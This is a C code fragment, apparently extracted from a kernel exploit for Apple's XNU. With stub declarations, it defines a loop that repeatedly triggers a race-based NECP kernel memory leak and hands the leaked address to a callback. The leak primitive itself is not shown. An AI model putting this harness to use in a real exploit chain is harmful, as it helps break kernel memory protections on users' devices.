
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






struct map_address_racer_context {int restart; int size; int address; } ;
typedef scalar_t__ (* kernel_leak_callback_block ) (int ,int ) ;


 int DEBUG_TRACE (char*,size_t,char*) ;
 int ERROR (char*,size_t) ;
 scalar_t__ try_necp_leak (int,struct map_address_racer_context*) ;

__attribute__((used)) static bool try_necp_leak_repeat(int ctlfd, kernel_leak_callback_block kernel_leak_callback,
  struct map_address_racer_context *context) {
 const size_t MAX_TRIES = 10000000;
 bool has_leaked = 0;
 for (size_t try = 1;; try++) {

  if (try_necp_leak(ctlfd, context)) {
   DEBUG_TRACE("Triggered the leak after %zu %s!", try,
     (try == 1 ? "try" : "tries"));
   try = 0;
   has_leaked = 1;

   if (kernel_leak_callback(context->address, context->size)) {
    return 1;
   }
  }

  if (!has_leaked && try >= MAX_TRIES) {
   ERROR("Giving up after %zu unsuccessful leak attempts", try);
   return 0;
  }

  context->restart = 1;
 }
}
